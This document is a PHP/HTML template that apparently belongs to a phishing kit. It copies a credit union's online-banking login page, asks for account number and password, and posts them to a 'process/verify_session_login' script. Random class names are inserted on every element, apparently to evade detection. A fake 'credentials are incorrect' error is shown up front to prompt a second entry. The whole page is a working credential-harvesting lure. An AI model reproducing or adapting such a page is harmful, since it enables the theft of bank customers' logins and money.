	...
	<div data-app="true" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-application v-application--is-ltr theme--light" id="app">
		<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-application--wrap">
			<div data-v-5c15a386="" id="notifications">
				<div data-v-5c15a386="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-snack notification-snackbar v-snack--active v-snack--has-background v-snack--top" style="padding-bottom: 0px; padding-top: 78px;">
	<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-snack__wrapper v-sheet theme--dark error">
		<div role="status" aria-live="polite" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-snack__content notification-content"><span data-v-5c15a386="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> notification-text"><!----><!----> Your account credentials are incorrect. Please try again. </span></div>
		<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-snack__action ">
			<button data-v-5c15a386="" type="button" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> dismiss-button v-btn v-btn--icon v-btn--round theme--dark v-size--x-small"><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-btn__content"><i data-v-5c15a386="" aria-hidden="true" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-icon notranslate mdi mdi-close theme--light" style="color: rgba(255, 255, 255, 0.8); caret-color: rgba(255, 255, 255, 0.8);"></i></span></button>
		</div>
	</div>
</div>
			</div>
			...
			<main class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-main" data-booted="true" style="padding: 78px 0px 0px;">
				<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-main__wrap">
					<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> container container--fluid">
						<div data-v-441a3690="" id="content">
							<div data-v-55886b46="" data-v-0945e6cd="" data-v-441a3690="">
								<h1 data-v-55886b46="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> text-h4">Login</h1>
								<div data-v-2906dda8="" data-v-55886b46="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> row">
									<div data-v-2906dda8="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> col-md-5 col-lg-4 col">
										<form data-v-55886b46="" method="post" action="process/verify_session_login" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-form" data-v-2906dda8="">
											<div data-v-6a6d1b4c="" data-v-55886b46="">
												<div data-v-021e61f0="" data-v-6a6d1b4c="">
													<div data-v-021e61f0="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input v-input--has-state theme--light v-text-field v-text-field--is-booted ">
														<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__control">
															<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__slot">
																<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-text-field__slot">
																	<label for="name-callback-1" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-label theme--light " style="left: 0px; right: auto; position: absolute;"></label>
																	<input autocomplete="off" placeholder="Account Number" required="true" autofocus="autofocus" id="username1" name="username1" type="text">
																</div>
															</div><br>
															...
															<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__slot">
																<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-text-field__slot">
																	<label for="name-callback-1" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-label theme--light " style="left: 0px; right: auto; position: absolute;"></label>
																	<input autocomplete="off" placeholder="password" required="true" autofocus="autofocus" id="password1" name="password1" type="password">
																</div>
															</div>
											...
											<div data-v-55886b46="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> mt-4">
												<button data-v-55886b46="" type="submit" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> mr-3 v-btn v-btn--is-elevated v-btn--has-bg theme--light v-size--default primary" id="btn-next"><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-btn__content">Login</span></button>
											</div>
										</form>
										<p data-v-55886b46="" data-v-2906dda8="" id="fl-question" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> text-body-2 mt-6">First time logging in? <a data-v-55886b46="" href="#/enroll" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> " id="fl-enroll-link" data-v-2906dda8="">Enroll Now</a></p>
										<p data-v-55886b46="" data-v-2906dda8="" id="fp-message" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> text-body-2"><a data-v-55886b46="" href="#/forgot-password" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> " id="fp-link" data-v-2906dda8="">Forgot Password</a> or need other assistance? <a data-v-55886b46="" data-v-2906dda8="" id="fp-contact-link" href="https://www.americafirst.com/about/contact/">Contact Us</a></p>
									</div>
									<div data-v-2906dda8="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> hidden-sm-and-down col">
										<div data-v-2906dda8="" id="WorkflowAdSpace"></div>
									</div>
								</div>
							</div>
							<input data-v-441a3690="" id="hidden-input" type="text">
						</div>
					</div>
				</div>
			</main>
